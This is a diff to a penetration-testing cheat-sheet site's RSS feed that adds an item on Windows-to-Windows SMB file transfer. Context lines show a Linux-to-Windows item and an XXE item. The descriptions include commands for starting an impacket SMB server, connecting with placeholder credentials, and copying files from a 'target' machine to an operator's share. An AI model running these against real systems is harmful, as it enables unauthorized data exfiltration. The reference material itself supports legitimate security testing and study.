@@ -22,6 +22,13 @@
       <description>SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From target Windows to local Linux copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From local Linux to target Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Older Windows (e.</description>
     </item>
     <item>
+      <title>File Transfer (Windows To Windows)</title>
+      <link>https://tldrbins.github.io/file_transfer_windows_to_windows/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_windows_to_windows/</guid>
+      <description>SMB # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with server name net use \\&amp;lt;SERVER_NAME&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Mount to a drive with creds net use X: \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From local Windows to target Windows copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From target Windows to local Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Remove drive net use /d X: # Older Windows (e.</description>
+    </item>
+    <item>
       <title>XXE (XML External Entity)</title>
       <link>https://tldrbins.github.io/xxe/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
